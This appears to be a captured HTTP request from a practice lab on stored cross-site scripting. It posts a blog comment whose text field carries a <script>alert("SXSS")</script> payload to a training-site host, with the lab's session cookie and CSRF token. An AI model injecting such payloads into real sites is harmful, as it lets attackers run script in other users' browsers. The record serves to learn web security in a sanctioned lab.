# Lab: Stored XSS into HTML context with nothing encoded

POST /post/comment HTTP/2
Host: 0af5006604eb709d80d917b9009e0086.web-security-academy.net
Cookie: session=LsQYxRqCEfbJfsAZYOsZfTzjFSjzA0Ra
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 213
Origin: https://0af5006604eb709d80d917b9009e0086.web-security-academy.net
Referer: https://0af5006604eb709d80d917b9009e0086.web-security-academy.net/post?postId=10
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

csrf=UReFL0LxAE9COW7yOiPxkOjJdpgSfWMP&postId=10&ent=<script>alert("SXSS")</script>&name=p&email=p%40mail.com&website=https%3A%2F%2F0af5006604eb709d80d917b9009e0086.web-security-academy.net%2Fpost%3FpostId%3D10